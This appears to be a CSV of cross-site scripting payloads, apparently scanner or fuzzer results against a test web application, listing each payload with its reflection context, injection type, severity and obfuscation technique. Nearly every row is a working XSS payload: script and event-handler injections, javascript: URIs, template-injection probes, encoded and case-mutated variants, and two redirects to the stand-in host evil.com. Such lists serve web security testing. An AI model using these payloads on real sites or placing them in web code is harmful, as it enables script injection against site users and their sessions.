payload,payload_with_context,context,severity,source,sink,reflection_position,technique
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">onerror=""alert('A]",tag_injection,medium,,,html_body,none
"""><iframe>alert(String.fromCharCode(88,83,83))</script>","""><iframe>alert(String.fromCharCode(88,83,83))</script> [position:html_body snippet_context:""><iframe>alert(String.fromCharCode(88,83,83))</script>({""status"": ""ok"", ""message"": ""Nexora API resp]",tag_injection,high,,,html_body,mutated
\' onerror=al'+'ert(1)//,\' onerror=al'+'ert(1)// [position:style],attribute_escape,low,,,style,obfuscated:concat_split
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:script]",tag_injection,low,,,script,original
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,medium,,,script,original
"""><script alert(String.fromCharCode(88,83,83))</script>","""><script alert(String.fromCharCode(88,83,83))</script> [position:html_body snippet_context:...HTML and inside a JS object literal.</p> <h2>Multi-Param Reflection</h2> <p>a = ""><script alert(S]",tag_injection,high,,,html_body,encoding
<;BODY ONLOAD=alert(';XSS';)>;,<;BODY ONLOAD=alert(';XSS';)>; [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <;BODY ONLOAD=ale],tag_injection,medium,,,attribute,none
-alert(1)-',"-alert(1)-' [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif"">-alert(1)-'</text]",tag_injection,medium,,,html_body,none
-alert(23)/,"-alert(23)/ [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=-alert(23)/""> <link rel=""style]",tag_injection,medium,,,attribute,none
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,low,,,none,obfuscated:url_encode
"onload=""prompt`1`""","onload=""prompt`1`"" [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div>onload=""prompt`1`""</div>]",tag_injection,medium,,,html_body,mutated
${alert(1)},${alert(1)} [position:none],template_injection,medium,,,none,original
OnlOAD='AlERT(1)',OnlOAD='AlERT(1)' [position:html_body],tag_injection,medium,,,html_body,mutated
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,"6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/ [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = ""6'%22()%26%25%22%]",tag_injection,medium,,,script,url_encoding
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,low,,,html_body,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,medium,,,html_body,original
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:attribute snippet_context:....82rem;color:var(--text-muted);margin-bottom:1rem"">Showing results for: <strong><svg onload=""conf]",tag_injection,medium,,,attribute,none
onload='alert(1)',onload='alert(1)' [position:html_body],tag_injection,medium,,,html_body,none
alert(1);,alert(1); [position:comment snippet_context:...de> or <code>?expr=alert(document.cookie)</code></p> </div> <!-- param:expr=alert(1); --> <div cl],tag_injection,medium,,,comment,none
<BODY ONLOAD=alert(8839)>,"<BODY ONLOAD=alert(8839)> [position:html_body snippet_context:...rm> </div> <div style=""font-size:.9rem;color:var(--text-secondary)""><BODY ONLOAD=alert(8839)></di]",tag_injection,medium,,,html_body,case_variation
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute_escape,medium,,,attribute,original
"<embed src=""javascript:al'+'ert(1)"">","<embed src=""javascript:al'+'ert(1)""> [position:html_body]",tag_injection,high,,,html_body,obfuscated:concat_split
onload='alert(1)',"onload='alert(1)' [position:attribute snippet_context:...ary);margin:.75rem 0"">Click below to continue to your destination.</p> <a href=""onload='alert(1)']",tag_injection,medium,,,attribute,none
"onerror=""alert(1)""","onerror=""alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,none
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:style]",event_handler,high,,,style,original
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;","<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>; [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid <;SCRIPT>;alert(S]",tag_injection,high,,,attribute,encoding
alert(1);,alert(1); [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:alert(1);</code><],tag_injection,medium,,,attribute,none
"onerror=""window.alert(1)""","onerror=""window.alert(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:style]",js_uri,high,,,style,original
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],script_injection,low,,,script,original
"<iframe src=""javascript:confirm(1)"">","<iframe src=""javascript:confirm(1)""> [position:html_body]",tag_injection,medium,,,html_body,mutated
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,low,,,attribute,mutated
"<embed src=""javascript:al'+'ert(1)"">","<embed src=""javascript:al'+'ert(1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:concat_split
onerror=alert(0);>,"onerror=alert(0);> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:onerror=alert(0);]",tag_injection,medium,,,attribute,none
<BODY ONLOAD=alert(‘XSS’)>,"<BODY ONLOAD=alert(‘XSS’)> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><BODY ONLOAD=aler]",tag_injection,medium,,,html_body,case_variation
' onmouseover=\u0061\u006cert(1) ',' onmouseover=\u0061\u006cert(1) ' [position:attribute],js_uri,low,,,attribute,obfuscated:unicode_escape
#{aLeRt(1)},#{aLeRt(1)} [position:attribute],template_injection,low,,,attribute,obfuscated:mixed_case
\' onerror=alert(1)//,\' onerror=alert(1)// [position:style],attribute_escape,low,,,style,original
"""><svg onload=alert(1)>","""><svg onload=alert(1)> [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:""><svg onload=ale]",attribute_escape,medium,,,attribute,none
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:script],script_injection,low,,,script,mutated
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:script]",tag_injection,low,,,script,original
"<svg onload=""confirm(7)"">","<svg onload=""confirm(7)""> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)""><svg onload=""confirm(7)]",tag_injection,medium,,,html_body,none
"oNERROR=""alErT(1)""","oNERROR=""alErT(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
<img src/onerror=prompt(8)>,"<img src/onerror=prompt(8)> [position:html_body snippet_context:...t-primary);padding:.65rem .9rem;border-radius:6px;font-family:Inter,sans-serif""><img src/onerror=]",tag_injection,medium,,,html_body,none
"""></tag><svg onload=alert(1)>","""></tag><svg onload=alert(1)> [position:script snippet_context:...ong>Sink:</strong> <code>lang</code> inside JS string: <code>var currentLang = """"></tag><svg onlo]",tag_injection,medium,,,script,none
<img src/onerror=alert(1)>,"<img src/onerror=alert(1)> [position:html_body snippet_context:...gin-bottom:.75rem"">Bio</div> <div style=""font-size:.925rem;line-height:1.7""><img src/onerror=aler]",tag_injection,medium,,,html_body,none
"&lt;embed src=""javascript:alert(1)""&gt;","&lt;embed src=""javascript:alert(1)""&gt; [position:attribute]",attribute_escape,high,,,attribute,obfuscated:html_entity
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('onerror=""alert('A]",tag_injection,medium,,,attribute,none
prompt(9),"prompt(9) [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('prompt(9)')""</cod]",tag_injection,medium,,,attribute,none
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,high,,,script,mutated
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:attribute snippet_context:<!DOCTYPE html><html><head> <meta http-equiv=""refresh"" content=""5;url=innerHTML=location.hash>#<scri]",tag_injection,high,,,attribute,none
%3cimg onerror=alert(1) src=a%3e,"%3cimg onerror=alert(1) src=a%3e [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('%3cimg onerror=al]",tag_injection,medium,,,attribute,url_encoding
setInTeRvAl('aLE'+'rt(10)');,"setInTeRvAl('aLE'+'rt(10)'); [position:html_body snippet_context:...<div class=""post-meta""><span class=""post-author"">Guest</span></div> <div>setInTeRvAl('aLE'+'rt(10]",tag_injection,high,,,html_body,mutated
"document.write(""<img src=x onload=alert(1)>"")","document.write(""<img src=x onload=alert(1)>"") [position:script]",template_injection,low,,,script,mutated
"OnerrOr=""AlErt(1)""","OnerrOr=""AlErt(1)"" [position:html_body]",tag_injection,medium,,,html_body,mutated
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;","<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>; [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<;SCRIPT>;alert(S]",tag_injection,high,,,attribute,encoding
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:style]",template_injection,low,,,style,original
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:attribute],attribute_escape,high,,,attribute,mutated
"""><svg onload=alert()>","""><svg onload=alert()> [position:html_body snippet_context:..."">Untitled</div> <div style=""font-size:.9rem;color:var(--text-secondary)"">""><svg onload=alert()><]",tag_injection,medium,,,html_body,none
<img src/onerror=prompt(8)>,"<img src/onerror=prompt(8)> [position:attribute snippet_context:...-radius:6px;cursor:pointer;margin-left:.5rem"">Load</button></form> <iframe src=""<img src/onerror=]",tag_injection,medium,,,attribute,none
innerHTML=location.hash>#<script>alert(1)</script>,"innerHTML=location.hash>#<script>alert(1)</script> [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:innerHTML=locatio]",tag_injection,high,,,attribute,none
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:attribute],attribute_escape,high,,,attribute,obfuscated:unicode_escape
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,high,,,attribute,original
javascript:alert(document.domain),javascript:alert(document.domain) [position:html_body],js_uri,medium,,,html_body,mutated
""" onerror=\u0061\u006cert(1) x=""",""" onerror=\u0061\u006cert(1) x="" [position:attribute]",attribute_escape,medium,,,attribute,obfuscated:unicode_escape
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,low,,,script,original
<svg/onload=confirm(1)>,<svg/onload=confirm(1)> [position:attribute],attribute_escape,high,,,attribute,mutated
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,medium,,,attribute,original
alert(2),alert(2) [position:attribute snippet_context:...round:var(--bg-0);color:var(--text-primary);padding:2rem} .box{border:2px solid alert(2);padding:],tag_injection,medium,,,attribute,none
"<embed src=""javaSCRIPT:alert(1)"">","<embed src=""javaSCRIPT:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,mutated
"onerror=""alert('AnonKryptiQuz')""","onerror=""alert('AnonKryptiQuz')"" [position:attribute snippet_context:..."">Nexora Member</span></div> </div> </div> <div class=""card"" data-user=""onerror=""alert('AnonKrypt]",tag_injection,medium,,,attribute,none
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],script_injection,medium,,,script,original
onload=”alert(‘AnonKryptiQuz’),"onload=”alert(‘AnonKryptiQuz’) [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('onload=”alert(‘An]",tag_injection,medium,,,attribute,none
"onload=""alert(1)""","onload=""alert(1)"" [position:html_body snippet_context:...st-meta""><span class=""post-author"">Anonymous</span> · just now</div> <div>onload=""alert(1)""</div>]",tag_injection,medium,,,html_body,none
{{7*7}},{{7*7}} [position:attribute],template_injection,high,,,attribute,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,medium,,,html_body,original
"//"";alert(String.fromCharCode(88,83,83))","//"";alert(String.fromCharCode(88,83,83)) [position:script snippet_context:...st-meta""><span class=""post-author"">Anonymous</span> · just now</div> <div>//"";alert(String.fromCh]",tag_injection,high,,,script,encoding
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute_escape,low,,,attribute,original
"%3Ciframe src=""javascript:alert(1)""%3E","%3Ciframe src=""javascript:alert(1)""%3E [position:html_body]",event_handler,low,,,html_body,obfuscated:url_encode
<svg////////onload=alert(1)>,"<svg////////onload=alert(1)> [position:comment snippet_context:...style=""color:var(--text-muted);font-size:.875rem"">← DOM XSS</a> <!-- param:save=<svg////////onloa]",tag_injection,medium,,,comment,none
confirm(),"confirm() [position:attribute snippet_context:...ng>Sink:</strong> <code>val</code> inside onclick handler: <code>onclick=""calc('confirm()')""</cod]",tag_injection,medium,,,attribute,none
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],event_handler,low,,,html_body,original
alert(1),alert(1) [position:attribute snippet_context:...g> <code>color</code> param in unquoted attribute: <code>style=background-color:alert(1)</code></],tag_injection,medium,,,attribute,none
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,low,,,script,original
onerror=alert(0);>,onerror=alert(0);> [position:html_body],tag_injection,medium,,,html_body,none
${alert(	1)},${alert(	1)} [position:none],template_injection,medium,,,none,obfuscated:tab_newline_inject
onerror='alert(1)',"onerror='alert(1)' [position:attribute snippet_context:...ref=""/static/style.css""> <style>body{background:var(--bg-0)} .themed{background:onerror='alert(1)]",tag_injection,medium,,,attribute,none
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,medium,,,script,original
